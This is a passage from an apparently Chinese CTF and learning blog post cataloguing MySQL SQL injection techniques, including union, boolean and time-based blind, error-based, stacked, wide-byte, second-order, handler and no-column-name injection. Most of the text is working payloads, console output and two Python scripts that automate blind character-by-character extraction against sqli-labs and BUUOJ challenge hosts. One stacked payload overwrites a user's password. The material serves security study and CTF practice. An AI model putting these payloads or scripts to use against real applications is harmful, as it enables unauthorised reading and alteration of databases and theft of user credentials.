title="联合注入"></a>联合注入</h1><pre><code class="python">xx&#39; union select 1,(select database())#</code></pre><pre><code class="python">mysql&gt; select * from users where id=-1 union select 1,user(),3;+----+----------------+----------+| id | username       | password |+----+----------------+----------+|  1 | root@localhost | 3        |+----+----------------+----------+1 row in set (0.00 sec)</code></pre><h1 id="bool注入"><a href="#bool注入" class="headerlink" title="bool注入"></a>bool注入</h1><p>substr(str,start,long)<br>str是待切分的字符串，start是切分起始位置(下标从1开始)，long是切分长度<br>if(exp1,exp2,exp3)<br>如果满足exp1,那么执行exp2,否则执行exp3<br>payload:</p><pre><code class="python">xx&#39; or if((substr((select database()),1,1)=&#39;c&#39;),1,0) #　　　　//判断数据库第一个字符是否为cxx&#39; or if((substr((select database()),2,1)=&#39;t&#39;),1,0) #　</code></pre><p>假设 , (逗号)被过滤了，可以用如下方式处理<br>if(exp1, exp2, exp3) =&gt; case when exp1 then exp2 else exp3 end<br>substr(exp1, 1, 1) =&gt; substr(exp1) from 1 for 1</p><pre><code class="python">xx&#39; or case when (substr((select database()) from 1 for 1)=&#39;c&#39;) then 1 else 0 end #</code></pre><p> 假设substr被过滤了，可以用如下方式处理<br>LOCATE(substr,str,pos)<br>返回子串 substr 在字符串 str 中的第 pos 位置后第一次出现的位置。如果 substr 不在 str 中返回 0<br>ps：因为mysql对大小写不敏感，所有写的时候用 locate(binary’S’, str, 1) 加个binary即可</p><pre><code class="python">xx&#39; or if((locate(binary&#39;c&#39;,(select database()),1)=1),1,0) #xx&#39; or if((locate(binary&#39;t&#39;,(select database()),1)=2),1,0) #</code></pre><h1 id="延迟注入"><a href="#延迟注入" class="headerlink" title="延迟注入"></a>延迟注入</h1><p>在输入无论正确的sql语句还是错误的sql语句页面都一样的情况下可以使用该方法进行判断是否成功<br>延时注入的本质是执行成功后延时几秒后再回显，反之不会延时直接回显<br>还是利用if来判断结果正确与否，只是返回值用延时来代替1<br>方法：sleep，benchmark， 笛卡尔积等</p><pre><code class="python">#基于sleep的延迟 xx&#39; or if(length((select database()))&gt;1,sleep(5),1) #基于笛卡尔乘积运算时间造成的时间延迟xx&#39; or if(length((select database()))&gt;1,(select count(*) FROM information_schema.columns A,information_schema.columns p B,information_schema.columns C),1) # 基于benchmark的延迟 xx&#39;or if(length((select database()))&gt;1,(select BENCHMARK(10000000,md5(&#39;a&#39;))),1) #--大概会用2S时间</code></pre><pre><code class="python"># sleepmysql&gt; select * from users where id =-1 or if(length((select database()))&gt;1,sleep(2),1);Empty set (4.02 sec)# benchmarkmysql&gt; select * from users where id =-1 or if(length((select database()))&gt;1,(select BENCHMARK(10000000,md5(&#39;a&#39;))),1);Empty set (1.40 sec)</code></pre><p> benchmark和笛卡尔积的原理实质上是运算时间过长导致的延迟  </p><h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><p>报错注入前提是在后端代码有Exception这种异常处理的回显才能在web中用，不然即使能报错但是你不知道报错内容<br>报错注入函数很多<br><strong>1 floor()和rand()</strong></p><pre><code class="python">union select count(*),2,concat(&#39;:&#39;,(select database()),&#39;:&#39;,floor(rand()*2))as a from information_schema.tables group by a       /*利用错误信息得到当前数据库名*/</code></pre><p><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666847945122-532e8885-7278-4e3b-bcc4-7b8a42604734.png" alt="image.png"><br><strong>2 extractvalue()</strong><br>updatexml一样，限制长度也是32位。</p><pre><code class="python">id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)))</code></pre><p><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666848282869-431f2e16-eef4-4a40-9352-585db732a0bc.png" alt="image.png"><br><strong>3 updatexml()</strong><br>updatexml（）这个函数最多只能爆32位字符，如果要爆的数据超过了这个位数，可以加上使用limit 0,1来查询后面数据。</p><pre><code class="python">id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1))</code></pre><p><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666848345412-c1787edd-3a00-482d-9f01-4c4d0ab5a9ed.png" alt="image.png"><br><strong>4 geometrycollection()</strong></p><pre><code class="python">id=1 and geometrycollection((select * from(select * from(select user())a)b))</code></pre><p> 5.5&lt;mysql版本&lt;5.6<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666850740062-904d57c0-5523-4e67-ae20-f2e41a68db31.png" alt="image.png"><br>后面几个用法一模一样，不再示范！<br><strong>5 multipoint()</strong></p><pre><code class="python">id=1 and multipoint((select * from(select * from(select user())a)b))</code></pre><p><strong>6 polygon()</strong></p><pre><code class="python">id=1 and polygon((select * from(select * from(select user())a)b))</code></pre><p><strong>7 multipolygon()</strong></p><pre><code class="python">id=1 and multipolygon((select * from(select * from(select user())a)b))</code></pre><p><strong>8 linestring()</strong></p><pre><code class="python">id=1 and linestring((select * from(select * from(select user())a)b))</code></pre><p><strong>9 multilinestring()</strong></p><pre><code class="python">id=1 and multilinestring((select * from(select * from(select user())a)b))</code></pre><p><strong>10 exp()</strong></p><pre><code class="python">id=1 and exp(~(select * from(select user())a))</code></pre><h1 id="堆叠查询注入"><a href="#堆叠查询注入" class="headerlink" title="堆叠查询注入"></a>堆叠查询注入</h1><p>union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句</p><pre><code class="python">mysql&gt; select * from users where id=1;select * from users where id =2;+----+----------+----------+| id | username | password |+----+----------+----------+|  1 | Dumb     | Dumb     |+----+----------+----------+1 row in set (0.00 sec)+----+----------+------------+| id | username | password   |+----+----------+------------+|  2 | Angelina | I-kill-you |+----+----------+------------+1 row in set (0.00 sec)</code></pre><p>堆叠注入触发的条件很苛刻,因为堆叠注入原理就是通过结束符同时执行多条sql语句,这就需要服务器在访问数据端时使用的是可同时执行多条sql语句的方法,比如php中mysqli_multi_query()函数,这个函数在支持同时执行多条sql语句,而与之对应的mysqli_query()函数一次只能执行一条sql语句,所以要想目标存在堆叠注入,在目标主机没有对堆叠注入进行黑名单过滤的情况下必须存在类似于mysqli_multi_query()这样的函数,简单总结下来就是</p><pre><code class="python">    目标存在sql注入漏洞    目标未对&quot;;&quot;号进行过滤    目标中间层查询数据库信息时可同时执行多条sql语句</code></pre><p><strong>实例:sqllibs Less-38:</strong><br> 经过测试存在union联合注入,使用联合注入爆破出users表中有id、username、password三个 字段.<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666852427968-8100d5b0-a8ec-4eed-af6a-239de5fe82f4.png" alt="image.png"><br>我们来修改下这个用户的密码试试:</p><pre><code class="python">http://127.0.0.1/sqli-labs/Less-38/?id=-1&#39;union select 1,username,password from users limit 1,1;update users set password=666 where id=2;--+</code></pre><p>我们再来查询下,密码已经被改了<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666853455525-43a9bc6f-fc2d-4d15-963b-9514495b4c38.png" alt="image.png"><br>如果select被过滤。可以搭配desc来读取表的字段<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1667146017637-7253eec6-1f6e-42e0-9cb3-180eb4619f9e.png" alt="image.png"></p><h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><p>利用条件:</p><ul><li>[查询参数是被单引号包围的，传入的单引号又被转义符()转义，如在后台数据库中对接受的参数使用addslashes()或其过滤函数</li><li>数据库的编码为GBK</li></ul><p>payload:</p><pre><code class="python">id = -1%df&#39; union select 1,user(),3,%23</code></pre><p>当我们输入payload时，会在我们输入的单引号前加一个转义字符,就成了这样:</p><pre><code class="python">id = -1%df\&#39; union select 1,user(),3,%23</code></pre><p> 在 其中\的十六进制是%5c ,所以就构成了%df%5c，而在GBK编码方式下，%df%5c是一个繁体字“連”，所以单引号成功逃逸。<br> 用sqli-labs靶场进行演示，这里利用32关进行练习<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666854808597-8d091260-842e-4241-9924-e5c711538ba7.png" alt="image.png"><br>加单引号没有反应，加上%df<br>成功报错<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666854851705-427ddbe2-68ae-42ac-9f1c-425a3de566e0.png" alt="image.png"><br>后面的就正常查询即可，这里不再演示</p><h1 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h1><p>攻击者构造恶意的数据并存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。<br>即输入恶意的数据库查询语句时会被转义，但在数据库调用读取语句时又被还原导致语句执行。<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666886911068-75bca2f0-2664-47d0-8622-ca7ce86bd20a.png" alt="40cf06a986854c5eb85bd683f9b15553.png"><br>例题:<strong>sql-labs 24</strong><br>我们直接看源码，这是修改密码的部分:<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666887830878-82b43c68-1c06-44e3-8527-7185c46dafc7.png" alt="image.png"><br>如果我们输入的username变为:</p><pre><code class="python">admin&#39;#那么sql语句就被截断为:UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;$username&#39;#</code></pre><p>这样就不再需要旧密码，我们来操作一下<br>注册一个账号:</p><pre><code class="python">账号: admin&#39;#密码: 123456</code></pre><p><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666887956324-7b8db159-4370-4530-a6bb-fcdb075d4f8a.png" alt="image.png"><br>我们看下数据库:<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666888075339-a126f007-62a2-48df-a1a3-311008fe29a5.png" alt="image.png"><br>已经增加了用户进去,我们来修改下密码<br>旧密码就随便填一个了，然后输入我们的新密码 HY666<br>我们再看数据库，惊奇的发现admin的密码已经被改了<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666888302642-54292536-d66b-409d-9b24-d30c84d6a169.png" alt="image.png"></p><h1 id="异或注入"><a href="#异或注入" class="headerlink" title="异或注入"></a>异或注入</h1><p>异或是一种逻辑运算，运算法则简言之就是：两个条件相同（同真或同假）即为假(0)，两个条件不同即为真(1)，null与任何条件做异或运算都为null，如果从数学的角度理解就是，空集与任何集合的交集都为空。<br>mysql里异或运算符为^ 或者 xor<br><strong>两个同为真的条件做异或，结果为假</strong><br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666884915483-ee8995c5-e81d-4566-85a2-29b17d2672c2.png" alt="image.png"><br>** 两个同为假的条件做异或,结果为假**<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666884955054-9f7afafe-2778-4c4a-9a7e-cfbb4efb5493.png" alt="image.png"><br>** 一个条件为真,一个条件为假,结果为真**<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666885000745-7876f94e-b036-431a-bb0d-6de2e2ce01fd.png" alt="image.png"><br>** null与任何条件（真、假、null）做异或,结果都为null **<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666886143153-c8e79dff-78c0-493c-921f-5f1c6bd989f5.png" alt="image.png"></p><p>^和xor是有区别的<br>** ^运算符会做位异或运算 如1^2=3  **</p><pre><code class="python">mysql&gt; select 1^2;+-----+| 1^2 |+-----+|   3 |+-----+1 row in set (0.00 sec)mysql&gt; select 1^1;+-----+| 1^1 |+-----+|   0 |+-----+1 row in set (0.00 sec)</code></pre><p>** xor做逻辑运算 1 xor 0 会输出1 其他情况输出其他所有数据  **<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666886572236-c9576eab-e140-415d-bed8-c41e97ab78bc.png" alt="image.png"></p><h1 id="使用handler进行注入"><a href="#使用handler进行注入" class="headerlink" title="使用handler进行注入"></a>使用handler进行注入</h1><p>MySQL 除了可以使用 select 查询表中的数据，也可使用 handler 语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler 语句并不具备 select 语句的所有功能。它是 MySQL 专用的语句，并没有包含到SQL标准中。handler 语句提供通往表的直接通道的存储引擎接口，可以用于 MyISAM 和 InnoDB 表。<br>句柄 相当于一个指针，是一个广义的指针，不是特定指向某一个形式（整数、数组、对象等）</p><pre><code class="python"># 打开一个表名为 tbl_name 的表的句柄HANDLER tbl_name OPEN [ [AS] alias]# 1、通过指定索引查看表，可以指定从索引那一行开始，通过 NEXT 继续浏览HANDLER tbl_name READ index_name &#123; = | &lt;= | &gt;= | &lt; | &gt; &#125; (value1,value2,...)    [ WHERE where_condition ] [LIMIT ... ]# 2、通过索引查看表# FIRST: 获取第一行（索引最小的一行）# NEXT: 获取下一行# PREV: 获取上一行# LAST: 获取最后一行（索引最大的一行）HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125;    [ WHERE where_condition ] [LIMIT ... ]# 3、不通过索引查看表# READ FIRST: 获取句柄的第一行# READ NEXT: 依次获取其他行（当然也可以在获取句柄后直接使用获取第一行）# 最后一行执行之后再执行 READ NEXT 会返回一个空的结果HANDLER tbl_name READ &#123; FIRST | NEXT &#125;    [ WHERE where_condition ] [LIMIT ... ]# 关闭已打开的句柄HANDLER tbl_name CLOSE</code></pre><pre><code class="python">例如,现在已知一张表名为tablename：handler tablename open;handler tablename read frist;handler tablename close;</code></pre><p><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1667144238458-a8b92e12-e096-4685-8d1a-fbfb342ecfd9.png" alt="image.png"><br><strong>[强网杯 2019]随便注</strong><br>查表:<br>经过测试，存在堆叠注入</p><pre><code class="python">http://ec9153a3-31e5-4e9f-a39b-069e74896652.node4.buuoj.cn:81/?inject=-1%27;show%20tables;%23</code></pre><p><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1667144813840-a3748f88-d8cc-4a7d-8bb9-8f22c950fa46.png" alt="image.png"><br>进一步测试，发现select被过滤<br>使用desc查一些表:</p><pre><code class="python">http://ec9153a3-31e5-4e9f-a39b-069e74896652.node4.buuoj.cn:81/?inject=-1%27;desc%20`1919810931114514`;%23</code></pre><p><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1667145622072-dd4f5f40-8a91-4018-aab5-e8e5ad92c79d.png" alt="image.png"><br>后面就使用handler读数据:<br>最终payload:</p><pre><code class="python">http://ec9153a3-31e5-4e9f-a39b-069e74896652.node4.buuoj.cn:81/?inject=-1%27;handler `1919810931114514` open;handler `1919810931114514` read first;handler `1919810931114514` close;%23</code></pre><h1 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h1><h2 id="当information-schema库被禁用"><a href="#当information-schema库被禁用" class="headerlink" title="当information_schema库被禁用"></a>当information_schema库被禁用</h2><p> 在手工SQL注入时，我们常常会想着利用 information_schema库 来进行爆数据库名、表名、字段名，但如果 information_schema库 被禁用了怎么办？<br><strong>1. sys数据库</strong><br>在5.7以上的MYSQL中，新增了sys数据库，该库的基础数据来自information_schema和performance_chema，其本身不存储数据。可以通过其中的schema_auto_increment_columns来获取表名.<br>** 对表自增ID的监控  :**</p><ul><li>sys.schema_auto_increment_columns</li></ul><p><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666890730344-29689eec-51d0-4a01-a34f-6e11ef26aa51.png" alt="image.png"><br>我们可以利用这个表来读取表名:</p><pre><code class="python">mysql&gt; select table_name from sys.schema_auto_increment_columns;+--------------------------------+| table_name                     |+--------------------------------+| zzcms_looked_dls               || zzcms_ask                      || zzcms_usersetting              || message                        || zzcms_pinglun                  |...</code></pre><p> 但是 sys.schema_auto_increment_columns这个库有些局限性，一般要超级管理员才可以访问sys。<br>**查询表的统计信息，其中还包括Innodb缓冲池统计信息，默认情况下按照增删改查操作的总表I/O延迟时间（执行时间）降序排序  **</p><ul><li>sys.schema_table_statistics_with_buffer</li><li>sys.x$schema_table_statistics_with_buffer</li><li>…</li></ul><p><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666890163777-95ae65ae-63a4-4104-8518-1d5d0535fbb4.png" alt="image.png"></p><pre><code class="python">mysql&gt; select table_name from sys.schema_table_statistics_with_buffer;+--------------------------------+| table_name                     |+--------------------------------+| users                          || sys_config                     || pwmm2nzea4                     || httpinfo                       || member                         || message                        || users                          |...</code></pre><pre><code class="python">mysql&gt; select table_name from sys.x$schema_table_statistics_with_buffer;+--------------------------------+| table_name                     |+--------------------------------+| users                          || httpinfo                       || zzcms_askclass                 || zzcms_msg                      || zzcms_wangkan                  || emails                         || zzcms_help                     |</code></pre><p><strong>2.InnoDb引擎</strong><br> 从MYSQL5.5.8开始，InnoDB成为其默认存储引擎。而在MYSQL5.6以上的版本中，inndb增加了innodb_index_stats和innodb_table_stats两张表，这两张表中都存储了数据库和其数据表的信息，但是没有存储列名。<br>mysql.innodb_index_stats、mysql.innodb_table_index同样存放有库名表名  </p><ul><li>mysql.innodb_table_stats</li></ul><pre><code class="python">mysql&gt; select table_name from mysql.innodb_table_stats;+---------------+| table_name    |+---------------+| gtid_executed || sys_config    |+---------------+2 rows in set (0.00 sec)</code></pre><ul><li>mysql.innodb_index_stats</li></ul><pre><code class="python">mysql&gt; select table_name from mysql.innodb_index_stats;+---------------+| table_name    |+---------------+| gtid_executed || gtid_executed || gtid_executed || gtid_executed || sys_config    || sys_config    || sys_config    |+---------------+7 rows in set (0.00 sec)</code></pre><p>不过这些表里内容并不是很全<br>不过我们通过以上这些库也仅仅可以知道它们的表名而已，那么我们如何注出它们的字段名呢，这里我们就要引入无列名注入。</p><h2 id="取别名绕过列名查数据"><a href="#取别名绕过列名查数据" class="headerlink" title="取别名绕过列名查数据"></a>取别名绕过列名查数据</h2><p><strong>正常查询</strong><br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666891654963-b1a46076-d425-4adf-a936-4c504710b299.png" alt="image.png"><br><strong>将列名转换为任何可选的已知值</strong><br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666891730209-6b409134-24a2-4448-a6a6-4547db7ff4e1.png" alt="image.png"><br>此时我们发现列名变为1,2,3 受我们所控制<br><strong>代替列名读取数据</strong><br> 像这样就可以查询第二列的数据，在虚拟表中，列名都是1，2，3，所以我们在查询语句中要用 <code>2</code> 而不能直接用 2<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666892282277-87b5d646-8151-4ee0-99ab-304d0539cfc8.png" alt="image.png"><br>取别名也可以直接在后面加<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666892342943-2ff0edce-b1c5-4738-8878-a261926c6451.png" alt="image.png"><br><strong>注入payload</strong></p><pre><code class="python">-1&#39;union select 1,(select group_concat(b) from(select 1 as a,2 as b,3 as c union select * from users)as m),3#</code></pre><p><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666892865758-a850da85-0687-4866-83d7-0d2dc8b3e96f.png" alt="image.png"></p><h2 id="利用join爆列名"><a href="#利用join爆列名" class="headerlink" title="利用join爆列名"></a>利用join爆列名</h2><p>需要有回显才能使用<br>由于join是将两张表的列名给加起来，所以有可能会产生相同的列名，而在使用别名时，是不允出现相同的列名的，因此当它们两个一起使用时，就会爆出相同的列名的名称，从而获得列名<br><strong>正常查询</strong></p><pre><code class="python">mysql&gt; select * from users where id=-1;Empty set (0.00 sec)</code></pre><p><strong>使用join连接爆出相同列名的名称</strong></p><pre><code class="python">mysql&gt; select * from users where id=-1 union select * from (select * from users as a join users as b) as c;ERROR 1060 (42S21): Duplicate column name &#39;id&#39;</code></pre><p><strong>爆出剩余的列名名称</strong></p><pre><code class="python">mysql&gt; select * from users where id=-1 union select * from (select * from users as a join users as b using(id)) as c;ERROR 1060 (42S21): Duplicate column name &#39;username&#39;---------------------mysql&gt; select * from users where id=-1 union select * from (select * from users as a join users as b using(id,username)) as c;ERROR 1060 (42S21): Duplicate column name &#39;password&#39;</code></pre><p>这样所有字段全部都暴出来了<br><strong>注入payload</strong></p><pre><code class="python"># 获取第一个列名-1&#39; union all select * from (select * from users as a join users as b)as c## 获取下一个列名-1&#39; union all select*from (select * from users as a join users as b using(username))as c#</code></pre><h2 id="字符比较查询"><a href="#字符比较查询" class="headerlink" title="字符比较查询"></a>字符比较查询</h2><p>要知道比较两个字符串的大小与字符串的长度是没有关系的，给定两个字符串，会各取两个字符串的首字符ascii码来比较，不等式成立返回1，不等式不成立返回0  </p><pre><code class="python">mysql&gt; select (select &#39;f&#39;)&gt;(select &#39;a&#39;);+---------------------------+| (select &#39;f&#39;)&gt;(select &#39;a&#39;) |+---------------------------+|                         1 |+---------------------------+1 row in set (0.00 sec)mysql&gt; select (select &#39;f&#39;)&gt;(select &#39;g&#39;);+---------------------------+| (select &#39;f&#39;)&gt;(select &#39;g&#39;) |+---------------------------+|                         0 |+---------------------------+1 row in set (0.00 sec)mysql&gt; select (select &#39;f&#39;)&gt;(select &#39;agggggg&#39;);+---------------------------------+| (select &#39;f&#39;)&gt;(select &#39;agggggg&#39;) |+---------------------------------+|                               1 |+---------------------------------+1 row in set (0.00 sec)</code></pre><p>因为在<strong>相等</strong>时返回<strong>0</strong>，所以在进行爆破时，我们爆破出来的<strong>1</strong>的时候，是比正确字符要<strong>大1</strong>的，所以在编写脚本时，我们要**-1<strong>才能得到正确字符。<br>所以我们在设置循环上限时ascii值要大于或者等于</strong>127**<br>脚本如下：([GYCTF2020]Ezsqli)</p><pre><code class="python">import requestsurl=&#39;http://e0e4d9bf-1f0b-435c-aedf-6d1aa33856ce.node4.buuoj.cn:81/&#39;flag=&#39;&#39;for i in range(1,50):    for j in range(32,128):        hexchar=flag+chr(j)        # f1ag_1s_h3r3_hhhhh这个表应该只有一个数据，所以id为1，我们用select 1,xx就可以进行第二个字段的比较了        # 这个payload的意思就是f1ag_1s_h3r3_hhhhh第二个字段的数据每一个字符与这个字符串每隔一个字符一一比较大小，如果这个字符比较大，就返回True。以此类推，不断增加字符串长度，就可以得到完整的数据。        payload = &#39;2||((select 1,&quot;&#123;&#125;&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&#39;.format(hexchar)        #print(payload)        data=&#123;&#39;id&#39;:payload&#125;        re=requests.post(url=url,data=data)        if &#39;Nu1L&#39; in re.text:            flag+=chr(j-1)            print(flag)            break</code></pre><h1 id="sql盲注"><a href="#sql盲注" class="headerlink" title="sql盲注"></a>sql盲注</h1><p> 盲注：即在SQL注入过程中，SQL语句执行查询后，查询数据不能回显到前端页面中，我们需要使用一些特殊的方式来判断或尝试，这个过程成为盲注 </p><pre><code class="python">1.如果数据库运行返回结果时只反馈对错不会返回数据库中的信息 此时可以采用逻辑判断是否正确的盲注来获取信息。2.盲注是不能通过直接显示的途径来获取数据库数据的方法。在盲注中，攻击者根据其返回页面的不同来判断信息（可能是页面内容的不同，也可以是响应时间不同，一般分为三类,布尔盲注、延时盲注、报错盲注）</code></pre><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p><strong>原理：</strong>盲注查询是不需要返回结果的，仅判断语句是否正常执行即可，所以其返回可以看到一个布尔值，正常显示为true，报错或者是其他不正常显示为False<br>注入流程:</p><pre><code class="python">流程：求当前数据库的长度以及ASCII求当前数据库表的ASCII求当前数据库表中的个数求当前数据库表中其中一个表的表名长度求当前数据库中其中一个表的表名的ASCII求列名的数量求列名的长度求列名的ascii求字段的数量求字段内容的长度求字段内容的ascii</code></pre><p>以sql-labs第八关为例:<br>我们来简单测试下:</p><pre><code class="python">http://127.0.0.1/sqli-labs/Less-8/?id=1&#39;and length(database())=1--+</code></pre><p><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666943591164-d1756076-d55c-403c-947a-58fddd9293d4.png" alt="image.png"><br>当我们输入这样的语句，界面并没有反应，我们慢慢增加长度，到8时出现变化了:</p><pre><code class="python">http://127.0.0.1/sqli-labs/Less-8/?id=1&#39;and length(database())=8--+</code></pre><p><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666943606968-cf2ad664-42ad-403c-8744-b5eca01d7399.png" alt="image.png"><br>这就说明盲注成功了！<br>剩下的就是结合一些函数提取出对应的字符进行判断即可</p><pre><code class="python">这里以sqlabs靶场为例通过length函数 判断数据库长度和数据表字段信息数量。通过substr、ascii函数 判断数据库名、表名、字段值等。求数据库的长度       http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#39; and length(database()) = 8 --+判断数据库第一位的字母http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#39; and substr(database(),1,1) = &#39;s&#39; --+求数据库中表的长度第一个表名长度：&#39;and length((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1))=6--+第二个表名长度 &#39;and length((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 1,1))=8--+长度为6、8查询第一个表的第一位字符&#39;and ascii(substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),1,1))=117--+查询第二个表的第二个字符&#39;and ascii(substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 1,1),1,1))=117--+判断字段的长度&#39;and length((select column_name from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; limit 0,1))=6--+‘  判断字段长度名称第一个字母的ascii &#39;and ord(substr((select column_name from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; limit 1,1),1,1))=117--+判断第二位长度名称第一个字母的ascii&#39;and ord(substr((select column_name from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; limit 1,1),2,1))=115--+</code></pre><p>然而这样的手工注入的效率我们是无法忍受的，我们可以基于二分法编写一个自动化脚本去帮助我们提升效率！</p><pre><code class="python">import requestsimport timeurl = &quot;http://127.0.0.1/sqli-labs/Less-8/&quot;data= &quot;&quot;for i in range(10000):    min = 32    max = 128    while (min &lt; max) :        mid = (min + max) // 2        # 爆破数据库名        payload = &quot;?id=1\&#39;and if(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&quot;.format(i, mid)        # 爆破表名        #payload = &quot;?id=1\&#39;and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=\&#39;security\&#39;),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&quot;.format(i, mid)        # 爆破字段        #payload = &quot;?id=1\&#39;and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=\&#39;users\&#39;),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&quot;.format(i, mid)        # 爆破数据        #payload = &quot;?id=1\&#39;and if(ascii(substr((select group_concat(username) from users),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&quot;.format(i, mid)        urls = url+payload        print(urls)        response = requests.get(url=urls)        if &quot;You&quot; in response.text:            min = mid+1        else:            max = mid        mid = (min + max) // 2    data += chr(mid)    print(data)</code></pre><p>首先我们启动第一个payload，看一下结果<br><strong>得到数据库名:</strong><br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666947971248-f6389bf2-db21-4a12-b751-bd9d9fc29b28.png" alt="image.png"><br><strong>启动第二个payload，得到表名:</strong><br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666948051467-a36e74af-fb19-46ff-8082-99d60f44d878.png" alt="image.png"><br><strong>启动第三个payload,我们查一下user表的字段</strong><br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666948117597-6fbc3ac8-0440-4ae7-a09d-fbcc4bcd917b.png" alt="image.png"><br><strong>启动最后一个payload，来获取username字段里的数据叭</strong><br>如图，成功得到了字段里的数据<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666948200677-0b7cb401-5693-410e-bda8-b40f64796037.png" alt="image.png"><br>通过脚本辅助注入可以极大的提升我们的注入效率！</p><h2 id="延迟盲注"><a href="#延迟盲注" class="headerlink" title="延迟盲注"></a>延迟盲注</h2><p>在输入无论正确的sql语句还是错误的sql语句页面都一样的情况下可以使用该方法进行判断是否成功<br>延时注入的本质是执行成功后延时几秒后再回显，反之不会延时直接回显<br>还是利用if来判断结果正确与否，只是返回值用延时来代替1<br>详情可查看上文，我们可以利用这个来判断是否注入，不过个人觉得并不适合批量跑数据，因为时间有太多的不可控性,我们拿来做个判断就好，同样用sqil-labs8来示范<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666948437175-8eccdf4a-4500-4756-a089-5f02c42b6244.png" alt="image.png"><br>这个页面过了10s左右才加载完毕，我们可以利用这个来判断是否存在注入</p><h2 id="爆错盲注"><a href="#爆错盲注" class="headerlink" 